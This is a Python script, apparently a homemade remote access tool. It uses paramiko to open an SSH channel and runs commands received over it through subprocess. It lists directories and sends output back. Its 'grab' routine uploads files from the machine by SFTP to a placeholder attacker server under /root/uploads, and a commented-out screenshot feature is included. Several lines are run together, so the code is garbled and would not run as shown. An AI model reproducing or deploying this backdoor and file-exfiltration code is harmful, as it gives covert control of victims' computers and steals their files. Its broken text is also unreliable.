#from PIL import ImageGrab
import paramiko
import threading
import subprocess
import osgiven_path = "."
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('127.0.0.1', username='User',password='password')
chan = client.get_transport().open_session()
chan.send('Hey I am connected :)')
print(chan.recv(1024))
def sftp(local_path,name):
 try:
  transport = paramiko.Transport(('ssh_server_ip_goes_here',ssh_server_port_here))
  transport.connect(username='ssh_username',password='ssh_passwd')
  sftp = paramiko.SFTPClient.from_transport(transport)  print(local_path)  name=name.strip('\'')
  sftp.put(local_path,'/root/uploads'+name)
  print('Gone')
  sftp.close()
  return '[+] Done'
 except Exception as e:
  return str(e) print('bravo')
while True: print('charlie')
 command = str(chan.recv(1024))  print('command '+command) print('alpha')
 if 'grab' in command:
  grab,name,path = command.split('*')  path = path.strip('\'')  print('Name: '+name+' Path: '+path)
  chan.send(sftp(path,name))  chan.send('Grabbed') if 'dir' in command:  dir,path = command.split('*')  path = path.strip('\'')  print('Path: '+path)  chan.send('b\''+str(os.listdir(path)))  chan.send('[+] Listed')#*/
 #elif 'screen' in command:
  #chan.send(screenshot()) try:  command = command.strip('b\'')  command = command.strip('\'')  print('cmd: '+command)
  CMD = subprocess.check_output(command)
  chan.send(CMD)
 except Exception as e:
  chan.send(str(e))

client.close

